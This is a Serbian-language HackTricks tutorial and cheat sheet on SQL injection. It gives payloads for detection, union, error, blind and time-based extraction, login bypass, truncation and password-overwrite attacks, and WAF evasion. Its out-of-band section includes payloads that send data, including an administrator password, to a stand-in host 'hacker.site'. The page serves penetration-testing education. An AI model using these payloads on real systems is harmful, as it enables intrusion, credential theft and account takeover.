# SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Šta je SQL injekcija?

**SQL injekcija** je sigurnosna greška koja omogućava napadačima da **ometaju upite baze podataka** aplikacije. Ova ranjivost može omogućiti napadačima da **vide**, **modifikuju** ili **obrišu** podatke kojima ne bi trebali imati pristup, uključujući informacije drugih korisnika ili bilo koje podatke kojima aplikacija može pristupiti. Takve radnje mogu rezultirati trajnim promenama u funkcionalnosti ili sadržaju aplikacije, pa čak i kompromitovanjem servera ili uskraćivanjem usluge.

## Otkrivanje ulazne tačke

Kada se čini da je sajt **ranjiv na SQL injekciju (SQLi)** zbog neobičnih odgovora servera na SQLi povezane ulaze, **prvi korak** je razumeti kako **ubaciti podatke u upit bez ometanja**. To zahteva identifikaciju metode za **efikasno izlazak iz trenutnog konteksta**. Ovo su neki korisni primeri:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Zatim, treba da znate kako da **popravite upit kako ne bi bilo grešaka**. Da biste popravili upit, možete **uneti** podatke tako da **prethodni upit prihvati nove podatke**, ili možete jednostavno **uneti** svoje podatke i **dodati simbol komentara na kraju**.

_Napomena: ako možete da vidite poruke o grešci ili primetite razlike kada upit radi i kada ne radi, ova faza će biti lakša._

### **Komentari**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Potvrđivanje logičkim operacijama

Pouzdana metoda za potvrđivanje SQL injection ranjivosti uključuje izvršavanje **logičke operacije** i posmatranje očekivanih rezultata. Na primer, GET parametar kao što je `?username=Peter` koji daje identičan sadržaj kada se izmeni u `?username=Peter' or '1'='1` ukazuje na SQL injection ranjivost.

Slično tome, primena **matematičkih operacija** služi kao efikasna tehnika potvrđivanja. Na primer, ako pristupanje `?id=1` i `?id=2-1` daje isti rezultat, to je pokazatelj SQL injection.

Primeri koji prikazuju potvrđivanje logičke operacije:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Ova lista reči je kreirana da pokuša da **potvrdi SQL injekcije** na predloženi način:

{{#file}}
sqli-logic.txt
{{#endfile}}

### Potvrđivanje sa vremenom

U nekim slučajevima **nećete primetiti nikakvu promenu** na stranici koju testirate. Stoga, dobar način da **otkrijete slepe SQL injekcije** je da naterate DB da izvrši radnje koje će imati **uticaj na vreme** koje je potrebno stranici da se učita.\
Zato ćemo u SQL upit dodati operaciju koja će potrajati dugo da se završi:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
U nekim slučajevima **funkcije spavanja neće biti dozvoljene**. Tada, umesto korišćenja tih funkcija, možete napraviti upit **koji izvršava složene operacije** koje će trajati nekoliko sekundi. _Primeri ovih tehnika biće komentarisani posebno za svaku tehnologiju (ako ih ima)_.

### Identifikacija Back-end-a

Najbolji način da identifikujete back-end je pokušaj izvršavanja funkcija različitih back-end-a. Možete koristiti _**sleep**_ **funkcije** iz prethodnog odeljka ili ove (tabela iz [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Takođe, ako imate pristup izlazu upita, mogli biste da **prikazujete verziju baze podataka**.

> [!NOTE]
> U nastavku ćemo razgovarati o različitim metodama za iskorišćavanje različitih vrsta SQL injekcija. Koristićemo MySQL kao primer.

### Identifikacija sa PortSwigger

{{#ref}}
https://portswigger.net/web-security/sql-injection/cheat-sheet
{{#endref}}

## Iskorišćavanje zasnovano na Uniji

### Otkrivanje broja kolona

Ako možete da vidite izlaz upita, ovo je najbolji način da ga iskoristite.\
Prvo, treba da saznamo **broj** **kolona** koje **početni zahtev** vraća. To je zato što **oba upita moraju vraćati isti broj kolona**.\
Dve metode se obično koriste u tu svrhu:

#### Order/Group by

Da biste odredili broj kolona u upitu, postepeno prilagodite broj korišćen u **ORDER BY** ili **GROUP BY** klauzulama dok ne dobijete lažan odgovor. Iako imaju različite funkcionalnosti, **GROUP BY** i **ORDER BY** se u SQL-u mogu koristiti na identičan način za utvrđivanje broja kolona u upitu.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Izaberite sve više i više null vrednosti dok upit ne bude tačan:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Trebalo bi da koristite `null` vrednosti jer u nekim slučajevima tipovi kolona sa obe strane upita moraju biti isti i null je validan u svakom slučaju._

### Izvlačenje imena baza podataka, imena tabela i imena kolona

U sledećim primerima ćemo preuzeti ime svih baza podataka, ime tabele u bazi podataka, imena kolona tabele:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Postoji različit način da se otkrije ovi podaci na svakoj različitoj bazi podataka, ali metodologija je uvek ista._

## Exploiting Hidden Union Based

Kada je izlaz upita vidljiv, ali se čini da je injekcija zasnovana na uniji nedostižna, to označava prisustvo **hidden union-based injection**. Ova situacija često dovodi do slepe injekcije. Da bi se slepa injekcija pretvorila u onu zasnovanu na uniji, potrebno je razjasniti izvršni upit na backendu.

To se može postići korišćenjem tehnika slepe injekcije zajedno sa podrazumevanim tabelama specifičnim za vaš ciljani Sistem za upravljanje bazama podataka (DBMS). Za razumevanje ovih podrazumevanih tabela, savetuje se konsultacija sa dokumentacijom ciljanog DBMS-a.

Kada je upit izvučen, potrebno je prilagoditi vaš payload da sigurno zatvori originalni upit. Nakon toga, unija upit se dodaje vašem payload-u, olakšavajući eksploataciju novonastale injekcije zasnovane na uniji.

Za sveobuhvatnije uvide, pogledajte ceo članak dostupan na [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Exploiting Error based

Ako iz nekog razloga **ne možete** da vidite **izlaz** **upita**, ali možete **videti poruke o grešci**, možete iskoristiti ove poruke o grešci da **izvucite** podatke iz baze podataka.\
Prateći sličan tok kao u eksploataciji zasnovanoj na uniji, mogli biste uspeti da dump-ujete DB.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Iskorišćavanje Blind SQLi

U ovom slučaju ne možete videti rezultate upita ili greške, ali možete **razlikovati** kada upit **vraća** **tačan** ili **netočan** odgovor jer postoje različiti sadržaji na stranici.\
U ovom slučaju, možete iskoristiti to ponašanje da izvučete bazu podataka karakter po karakter:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Iskorišćavanje Error Blind SQLi

Ovo je **isti slučaj kao pre** ali umesto da razlikujete između tačnog/lažnog odgovora iz upita, možete **razlikovati između** **greške** u SQL upitu ili ne (možda zato što HTTP server pada). Stoga, u ovom slučaju možete izazvati SQL grešku svaki put kada tačno pogodite karakter:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Iskorišćavanje SQLi zasnovanog na vremenu

U ovom slučaju **nema** načina da se **razlikuje** **odgovor** upita na osnovu konteksta stranice. Međutim, možete učiniti da stranica **duže učitava** ako je pogodjeni karakter tačan. Već smo videli ovu tehniku u upotrebi ranije kako bismo [potvrdili SQLi ranjivost](#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

Možete koristiti stacked queries da **izvršite više upita uzastopno**. Imajte na umu da, iako se naredni upiti izvršavaju, **rezultati** se **ne vraćaju aplikaciji**. Stoga je ova tehnika prvenstveno korisna u vezi sa **blind vulnerabilities** gde možete koristiti drugi upit da pokrenete DNS lookup, uslovnu grešku ili vremensko kašnjenje.

**Oracle** ne podržava **stacked queries.** **MySQL, Microsoft** i **PostgreSQL** ih podržavaju: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

Ako **nijedna** druga metoda eksploatacije **nije uspela**, možete pokušati da **baza podataka ex-filtrira** informacije na **spoljni host** koji kontrolišete. Na primer, putem DNS upita:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Izvanbandna eksfiltracija podataka putem XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Automatizovana Eksploatacija

Proverite [SQLMap Cheatsheet](sqlmap/index.html) da biste iskoristili SQLi ranjivost sa [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Tehničke specifične informacije

Već smo razgovarali o svim načinima za eksploataciju SQL Injection ranjivosti. Pronađite još nekoliko trikova zavisnih od tehnologije baze podataka u ovoj knjizi:

- [MS Access](ms-access-sql-injection.md)
- [MSSQL](mssql-injection.md)
- [MySQL](mysql-injection/index.html)
- [Oracle](oracle-injection.md)
- [PostgreSQL](postgresql-injection/index.html)

Ili ćete pronaći **puno trikova vezanih za: MySQL, PostgreSQL, Oracle, MSSQL, SQLite i HQL u** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Zaobilaženje autentifikacije

Lista za pokušaj zaobilaženja funkcionalnosti prijavljivanja:

{{#ref}}
../login-bypass/sql-login-bypass.md
{{#endref}}

### Zaobilaženje autentifikacije sa sirovim hešom
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Ova upit prikazuje ranjivost kada se MD5 koristi sa true za sirovi izlaz u proverama autentifikacije, čineći sistem podložnim SQL injekciji. Napadači mogu iskoristiti ovo kreiranjem ulaza koji, kada se hash-uje, proizvode neočekivane delove SQL komandi, što dovodi do neovlašćenog pristupa.
```sql
md5("ffifdyop", true) = 'or'6�]��!r,��b�
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```
### Zaobilaženje autentifikacije putem injektovanog haša
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Preporučena lista**:

Trebalo bi da koristite kao korisničko ime svaku liniju sa liste, a kao lozinku uvek: _**Pass1234.**_\
&#xNAN;_(Ovi payloadi su takođe uključeni u veliku listu pomenutu na početku ovog odeljka)_

{{#file}}
sqli-hashbypass.txt
{{#endfile}}

### GBK autentifikacija zaobići

AKO se ' escape-uje, možete koristiti %A8%27, a kada se ' escape-uje, biće kreirano: 0xA80x5c0x27 (_╘'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python skripta:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Polyglot injection (multicontext)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Izmena lozinke postojećeg objekta/korisnika

Da biste to uradili, trebali biste pokušati da **kreirate novi objekat nazvan kao "master objekat"** (verovatno **admin** u slučaju korisnika) modifikujući nešto:

- Kreirajte korisnika nazvanog: **AdMIn** (velika i mala slova)
- Kreirajte korisnika nazvanog: **admin=**
- **SQL Truncation Attack** (kada postoji neka vrsta **ograničenja dužine** u korisničkom imenu ili emailu) --> Kreirajte korisnika sa imenom: **admin \[puno razmaka] a**

#### SQL Truncation Attack

Ako je baza podataka ranjiva i maksimalan broj karaktera za korisničko ime je, na primer, 30 i želite da se pretvarate da ste korisnik **admin**, pokušajte da kreirate korisničko ime pod nazivom: "_admin \[30 razmaka] a_" i bilo koju lozinku.

Baza podataka će **proveriti** da li uneto **korisničko ime** **postoji** unutar baze podataka. Ako **ne**, **izrezaće** **korisničko ime** na **maksimalan dozvoljeni broj karaktera** (u ovom slučaju na: "_admin \[25 razmaka]_") i automatski će **ukloniti sve razmake na kraju ažurirajući** unutar baze podataka korisnika "**admin**" sa **novom lozinkom** (može se pojaviti neka greška, ali to ne znači da ovo nije uspelo).

Više informacija: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Napomena: Ovaj napad više neće raditi kao što je opisano iznad u najnovijim MySQL instalacijama. Dok poređenja i dalje ignorišu razmake na kraju po defaultu, pokušaj umetanja stringa koji je duži od dužine polja rezultiraće greškom, a umetanje će propasti. Za više informacija o ovoj provali:_ [_https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation_](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)

### MySQL Insert provera zasnovana na vremenu

Dodajte koliko god `','',''` smatrate potrebnim da izađete iz VALUES izjave. Ako se izvrši kašnjenje, imate SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

Klauzula `ON DUPLICATE KEY UPDATE` u MySQL-u se koristi za određivanje akcija koje baza podataka treba da preduzme kada se pokuša umetanje reda koji bi rezultirao duplom vrednošću u UNIQUE indeksu ili PRIMARY KEY-u. Sledeći primer pokazuje kako se ova funkcija može iskoristiti za modifikaciju lozinke administratorskog naloga:

Example Payload Injection:

Injekcioni payload može biti kreiran na sledeći način, gde se pokušava umetanje dva reda u tabelu `users`. Prvi red je mamac, a drugi red cilja postojeću email adresu administratora sa namerom da se ažurira lozinka:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
Evo kako to funkcioniše:

- Upit pokušava da unese dva reda: jedan za `generic_user@example.com` i drugi za `admin_generic@example.com`.
- Ako red za `admin_generic@example.com` već postoji, `ON DUPLICATE KEY UPDATE` klauzula se aktivira, naređujući MySQL-u da ažurira polje `password` postojećeg reda na "bcrypt_hash_of_newpassword".
- Shodno tome, autentifikacija se može pokušati koristeći `admin_generic@example.com` sa lozinkom koja odgovara bcrypt hešu ("bcrypt_hash_of_newpassword" predstavlja bcrypt heš nove lozinke, koji treba zameniti stvarnim hešom željene lozinke).

### Ekstrakcija informacija

#### Kreiranje 2 naloga u isto vreme

Kada pokušavate da kreirate novog korisnika, potrebni su korisničko ime, lozinka i email:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Korišćenje decimalnog ili heksadecimalnog

Sa ovom tehnikom možete izvući informacije kreirajući samo 1 nalog. Važno je napomenuti da ne morate komentarisati ništa.

Korišćenjem **hex2dec** i **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Da biste dobili tekst, možete koristiti:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Koristeći **hex** i **replace** (i **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
## Routed SQL injection

Routed SQL injection je situacija u kojoj upit koji se može injektirati nije onaj koji daje izlaz, već izlaz injektiranog upita ide u upit koji daje izlaz. ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Example:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[Početni bypass-ovi odavde](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### No spaces bypass

No Space (%20) - bypass koristeći alternative za razmake
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - zaobilaženje korišćenjem komentara
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - zaobilaženje korišćenjem zagrada
```sql
?id=(1)and(1)=(1)--
```
### No commas bypass

No Comma - zaobilaženje korišćenjem OFFSET, FROM i JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Generic Bypasses

Blacklist koristeći ključne reči - zaobići koristeći velika/mala slova
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Blacklist koristeći ključne reči bez obzira na velika i mala slova - zaobići koristeći ekvivalentni operator
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass WAF pomoću naučne notacije

Možete pronaći detaljnije objašnjenje ove trik u [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
U suštini, možete koristiti naučnu notaciju na neočekivane načine kako biste zaobišli WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypass Column Names Restriction

Prvo, primetite da ako **originalni upit i tabela iz koje želite da izvučete zastavicu imaju isti broj kolona** možete jednostavno uraditi: `0 UNION SELECT * FROM flag`

Moguće je **pristupiti trećoj koloni tabele bez korišćenja njenog imena** koristeći upit poput sledećeg: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, tako da bi u sqlinjection ovo izgledalo ovako:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ili korišćenjem **comma bypass**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ova trik je preuzet sa [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Alati za predlaganje zaobilaženja WAF-a

{{#ref}}
https://github.com/m4ll0k/Atlas
{{#endref}}

## Ostali vodiči

- [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista za detekciju Brute-Force-a

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt
{{#endref}}

​
{{#include ../../banners/hacktricks-training.md}}
